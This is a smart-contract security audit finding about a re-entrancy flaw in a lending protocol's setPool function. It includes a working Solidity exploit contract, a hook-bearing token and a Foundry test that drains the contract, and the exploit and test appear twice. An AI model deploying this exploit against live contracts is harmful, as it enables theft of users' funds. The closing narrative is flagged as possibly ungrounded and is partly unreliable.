---
id: 3673
severity: "High"
---

# Lender contract can be drained by re-entrancy in `setPool`

## Description

Tokens allowing reentrant calls on transfer can be drained from the contract.

Some tokens allow reentrant calls on transfer (e.g. ERC777 tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
```
 
This kind of token allows a re-entrancy attack in the setPool function. When the new p.poolBalance is less than the currentBalance, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.sol

L157:    } else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer( // @audit - Critical Re-entrancy can drain contract
                p.lender,
                currentBalance - p.poolBalance
            );
        }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159

POC
An attacker can use the following exploit contract to drain the lender contract:
```solidity
File: Exploit3.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit3  {
    Lender lender;
    Pool pool;

    constructor(Lender _lender) {
        lender = _lender;
    }

    function attack(address _loanToken, uint256 _poolBalance) external {
        ERC20(_loanToken).approve(address(lender), _poolBalance);
        // [1] Create a new pool
        Pool memory p = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: address(0),
            minLoanSize: 10 * 10**18,
            poolBalance: _poolBalance,
            maxLoanRatio: 210 * 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        // [2] Update pool with 0 poolBalance
        p.poolBalance = 0;
        pool = p;
        lender.setPool(p);
        // [3] Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address to, uint256 amount) external {
        Pool memory p = pool;
        require(msg.sender == p.loanToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                if (lenderBalance < amount) {
                    p.poolBalance = amount - lenderBalance;
                }
                lender.setPool(p);
            }          
        }
    }
}
```

Here are the tests that can be added to Lender.t.sol to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
	// Setup
	address attacker = address(0x5); 
	WeirdToken weirdToken = new WeirdToken(10_500 * 10**18); 
	weirdToken.transfer(address(lender), 9_500 * 10**18);
	weirdToken.transfer(address(attacker), 1_000 * 10**18);

	// Before the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 9500 * 10**18);      // Lender contract has 9500 weirdToken
	assertEq(weirdToken.balanceOf(address(attacker)), 1000 * 10**18);    // Attacker has 1000 weirdToken

	// Exploit starts here
	vm.startPrank(attacker);
	Exploit3 attackContract = new Exploit3(lender);
	weirdToken.transfer(address(attackContract), 1_000 * 10**18);
	attackContract.attack(address(weirdToken), 1_000 * 10**18);

	// After the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
	assertEq(weirdToken.balanceOf(address(attacker)), 10_500 * 10**18);   // Attacker stole all the tokens
}
```

## Proof of Concept

An attacker can use the following exploit contract to drain the lender contract:
```solidity
File: Exploit3.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit3  {
    Lender lender;
    Pool pool;

    constructor(Lender _lender) {
        lender = _lender;
    }

    function attack(address _loanToken, uint256 _poolBalance) external {
        ERC20(_loanToken).approve(address(lender), _poolBalance);
        // [1] Create a new pool
        Pool memory p = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: address(0),
            minLoanSize: 10 * 10**18,
            poolBalance: _poolBalance,
            maxLoanRatio: 210 * 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        // [2] Update pool with 0 poolBalance
        p.poolBalance = 0;
        pool = p;
        lender.setPool(p);
        // [3] Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address to, uint256 amount) external {
        Pool memory p = pool;
        require(msg.sender == p.loanToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                if (lenderBalance < amount) {
                    p.poolBalance = amount - lenderBalance;
                }
                lender.setPool(p);
            }          
        }
    }
}
```

Here are the tests that can be added to Lender.t.sol to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
	// Setup
	address attacker = address(0x5); 
	WeirdToken weirdToken = new WeirdToken(10_500 * 10**18); 
	weirdToken.transfer(address(lender), 9_500 * 10**18);
	weirdToken.transfer(address(attacker), 1_000 * 10**18);

	// Before the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 9500 * 10**18);      // Lender contract has 9500 weirdToken
	assertEq(weirdToken.balanceOf(address(attacker)), 1000 * 10**18);    // Attacker has 1000 weirdToken

	// Exploit starts here
	vm.startPrank(attacker);
	Exploit3 attackContract = new Exploit3(lender);
	weirdToken.transfer(address(attackContract), 1_000 * 10**18);
	attackContract.attack(address(weirdToken), 1_000 * 10**18);

	// After the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
	assertEq(weirdToken.balanceOf(address(attacker)), 10_500 * 10**18);   // Attacker stole all the tokens
}
```

## Recommendation

Follow the Checks - Effect - Interactions (CEI) pattern by updating the pools mapping (Line 175) before transferring the funds AND use nonReentrant modifiers

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a classic re‑entrancy flaw that appears in the Lender contract when it interacts with tokens that allow a callback during a transfer, such as ERC777 tokens with an _afterTokenTransfer hook. The contract’s setPool function compares the new pool balance with the current balance and, if the new balance is lower, it sends the difference to the lender before updating the internal pool mapping. Because the external token transfer is performed first, a malicious token can invoke its hook (tokensReceived) during the transfer and call back into setPool while the contract’s state still reflects the old, higher balance. The attacker can therefore manipulate the poolBalance value on the re‑entered call, causing the contract to believe it still owes funds and triggering another transfer. By repeatedly re‑entering in this way, the attacker can drain all tokens held by the Lender contract. The issue manifests only when the token used for the loan supports re‑entrant callbacks and when setPool is called with a poolBalance that is lower than the contract’s current token balance. It affects any lender, borrower, or token holder that relies on the Lender contract for safe custody of funds, as the contract’s accounting assumptions are broken and the expected invariant that the pool balance never exceeds the contract’s token holdings is violated. The flaw was discovered during a security audit that included testing with a custom token implementing a transfer hook, and it can be hard to notice because the transfer itself succeeds and the token appears to follow the ERC20 interface, masking the hidden callback. From a user’s perspective the symptoms are that after a pool update the contract’s token balance becomes zero, the lender receives no refund, and the attacker ends up with all the tokens, effectively making the funds disappear. The proper mitigation is to follow the Checks‑Effects‑Interactions (CEI) pattern: update the pool mapping (or any relevant state) before performing any external token transfer, and protect the function with a nonReentrant guard to block recursive calls. This eliminates the window where an external call can manipulate contract state and restores the intended accounting guarantees.
